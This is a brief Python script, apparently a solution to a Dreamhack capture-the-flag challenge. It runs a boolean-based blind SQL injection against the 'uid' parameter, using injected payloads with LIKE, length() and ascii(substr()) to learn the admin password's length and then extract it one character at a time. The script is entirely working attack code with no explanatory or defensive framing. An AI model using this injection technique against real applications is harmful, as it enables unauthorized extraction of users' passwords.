import requests
url = "http://host3.dreamhack.games:13355"
for i in range(1,101):
    r = requests.get(url,params={"uid" : f"'||(length(upw))like({i})#"})
    if r.text.find("admin") != -1:
        print(f"password length is {i}")
        break
pw=""
for i in range(1,45):
    for j in range(33,128):
        r = requests.get(url,params={"uid" : f"'||(ascii(substr(upw,{i},1)))like({j})#"})
        if r.text.find("admin") != -1:
            pw += chr(j)
            print(f"{i} is {chr(j)}")
print(f"password is {pw}")

    
